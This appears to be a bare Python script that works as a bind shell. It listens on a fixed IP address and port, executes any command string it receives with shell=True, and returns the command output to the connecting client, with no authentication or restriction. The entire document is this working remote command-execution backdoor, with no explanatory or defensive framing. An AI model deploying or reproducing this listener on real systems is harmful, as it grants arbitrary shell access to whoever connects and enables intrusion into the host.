from socket import *
import subprocess
s = socket(AF_INET,SOCK_STREAM)
s.bind(('192.168.14.25',5268))
s.listen(5)
while True:
   new_s,addr = s.accept()
   data = new_s.recv(1024)
   sub = subprocess.Popen(data.decode(),shell = True,stdout = subprocess.PIPE,stderr = subprocess.PIPE)
   data1 = sub.stdout.read().decode('gbk') + sub.stderr.read().decode()
   new_s.send(data1.encode())
